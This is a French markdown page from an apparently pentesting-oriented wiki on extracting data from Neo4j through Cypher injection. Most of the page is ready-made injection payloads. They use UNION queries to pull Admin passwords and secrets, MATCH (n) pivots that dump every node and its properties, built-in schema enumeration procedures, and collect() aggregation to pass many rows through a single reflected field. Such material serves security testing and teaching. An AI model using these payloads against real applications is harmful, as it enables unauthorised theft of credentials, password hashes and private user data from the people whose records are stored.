---
order: 2
title: "Extraction de données via injection Cypher dans Neo4j"
description: "Extraction inter-labels via des clauses injectées UNION, WITH et MATCH (n) RETURN n, plus énumération de schéma avec db.labels() et db.schema dans Neo4j."
keywords:
  - extraction de données Neo4j
  - injection UNION Cypher
  - extraction inter-labels
  - db.labels
  - énumération du schéma de graphe
  - énumération de propriétés
---

# Extraction de données

Un graphe n'a pas de frontières de tables : chaque nœud vit dans un unique graphe de propriétés, de sorte qu'une seule clause injectée peut atteindre n'importe quel **label**, **propriété** ou **relation** indépendamment de ce que la requête d'origine sélectionnait. Une fois un point d'injection Cypher confirmé (voir [Injection Cypher](cypher-injection.md)), l'extraction consiste à orienter le jeu de résultats vers des nœuds que l'application n'a jamais eu l'intention d'exposer.

## Extraction par UNION

`UNION` ajoute les lignes d'une seconde requête à la première. Le nombre et les noms de colonnes doivent correspondre au `RETURN` d'origine, commencez donc par en reproduire la forme. Si la requête renvoie une seule colonne, renvoyez une valeur par ligne injectée :

```
' RETURN u.name AS x UNION MATCH (a:Admin) RETURN a.password AS x //
' RETURN u.name AS x UNION MATCH (n) RETURN n.secret AS x //
```

Chaque branche d'un `UNION` doit renvoyer des colonnes aux **noms identiques**, aliasez donc chaque projection avec le même nom (`AS x` ci-dessus) sous peine d'échec de compilation de la requête. `UNION ALL` conserve les doublons là où `UNION` les réduirait.

## Pivoter avec WITH et MATCH

Lorsque `UNION` est malcommode, fermez le littéral et ajoutez votre propre `MATCH`. `MATCH (n) RETURN n` sans label parcourt chaque nœud du graphe :

```
' WITH 1 AS x MATCH (n) RETURN n //
' WITH 1 AS x MATCH (n) RETURN labels(n), keys(n), properties(n) //
```

`labels(n)` liste les labels d'un nœud, `keys(n)` ses noms de propriété et `properties(n)` la carte complète des propriétés : trois fonctions qui dumpent la structure et le contenu ensemble sans connaissance préalable du schéma.

## Énumérer labels, propriétés et relations

Restreignez le parcours une fois que vous savez ce qui existe. Ces procédures intégrées exposent le schéma directement là où `CALL` est atteignable depuis le point d'injection :

```
' CALL db.labels() YIELD label RETURN label //
' CALL db.relationshipTypes() YIELD relationshipType RETURN relationshipType //
' CALL db.propertyKeys() YIELD propertyKey RETURN propertyKey //
```

`db.schema.visualization()` (ou l'ancien `db.schema()`) renvoie le modèle connecté label/relation en un seul appel :

```
' CALL db.schema.visualization() //
```

Une fois les labels en main, ciblez-en un en particulier et lisez chaque propriété :

```
' WITH 1 AS x MATCH (a:Admin) RETURN a //
' WITH 1 AS x MATCH (u:User) RETURN u.email, u.passwordHash //
```

Les relations exposent la façon dont les nœuds se connectent, souvent la partie sensible d'un graphe (qui administre quoi, qui peut accéder à qui) :

```
' WITH 1 AS x MATCH (a)-[r]->(b) RETURN labels(a), type(r), labels(b) //
' WITH 1 AS x MATCH (u:User)-[r:MEMBER_OF]->(g:Group) RETURN u.name, g.name //
```

## Regrouper de nombreuses lignes en une seule

Lorsque l'application ne reflète que la première ligne, agrégez tout le résultat en une seule valeur avec `collect()` pour qu'une réponse porte tout :

```
' WITH 1 AS x MATCH (u:User) RETURN collect(u.email) //
' WITH 1 AS x MATCH (n) RETURN collect(DISTINCT labels(n)) //
```

`collect()` construit une liste, `reduce()` ou la concaténation de chaînes peut l'aplatir davantage, et `apoc.convert.toJson()` sérialise un nœud ou une carte en un seul champ de chaîne là où APOC est présent (voir [Abus de procédures APOC](apoc-procedure-abuse.md)).

Lorsqu'aucune ligne n'est renvoyée du tout, l'extraction bascule vers [Injection aveugle](blind-injection.md).

## Outils

- **cypher-shell** : exécuter des requêtes UNION et d'énumération de schéma contre la base de données.
- **Burp Repeater** : livrer des payloads d'extraction inter-labels via le sink.

## Références

- [Neo4j : Built-in procedures (db.labels, db.schema)](https://neo4j.com/docs/operations-manual/current/reference/procedures/)
- [Neo4j : Cypher UNION](https://neo4j.com/docs/cypher-manual/current/clauses/union/)
- [Neo4j : Functions (labels, keys, properties)](https://neo4j.com/docs/cypher-manual/current/functions/)
